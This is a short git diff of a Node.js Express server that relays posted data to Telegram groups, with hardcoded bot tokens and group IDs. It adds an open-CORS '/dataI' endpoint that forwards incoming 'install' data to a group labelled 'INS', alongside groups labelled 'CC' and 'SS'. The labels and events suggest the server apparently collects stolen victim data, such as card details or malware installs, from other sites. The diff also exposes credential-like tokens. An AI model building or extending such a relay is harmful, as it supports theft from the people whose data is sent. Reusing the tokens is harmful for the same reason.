@@ -1,14 +1,15 @@
 // Importing necessary modules
 const TelegramBot = require('node-telegram-bot-api');
-const token = '7426606441:AAHUMNIEa8T4s1b2UkDYp49SEPZMWVtrJc8';
+const token = '7302867758:AAFV7L9BAlBPlObWDVtsj1KQB5i4Z_w1k58';
 const bot = new TelegramBot(token, { polling: false, request: {
     agentOptions: {
         keepAlive: true,
         family: 4
     }
 }});
-const groupIdCC = '-4216051328';
-const groupIdSS = '-4211577654';
+const groupIdCC = '-4203867031';
+const groupIdSS = '-4202948043';
+const groupIdINS = '-4256306418';
 
 const express = require('express');
 const http = require('http');
@@ -18,6 +19,9 @@ const socketIo = require('socket.io');
 const app = express();
 const port = process.env.PORT || 3000;
 
+const cors = require('cors');
+
+app.use(cors()); // Allow all origins
 app.use(express.json());
 
 // Create an HTTP server
@@ -45,6 +49,17 @@ app.post('/dataAlert', (req, res) => {
   //console.log('DATA IO',req.body.data);
   const data_ = req.body.data;
   io.emit('user_online',data_);
+  res.status(200).send(jsonData);
+});
+
+app.post('/dataI', (req, res) => {
+  //console.log('DATA C',req.body.data);
+  const data_ = req.body.data;
+  io.emit('install_got',data_);
+  bot.sendMessage(groupIdINS, data_).then(() => {})
+  .catch((error) => {
+      console.log("ERROR",error);
+  });
   res.status(200).send(jsonData);
 });
 
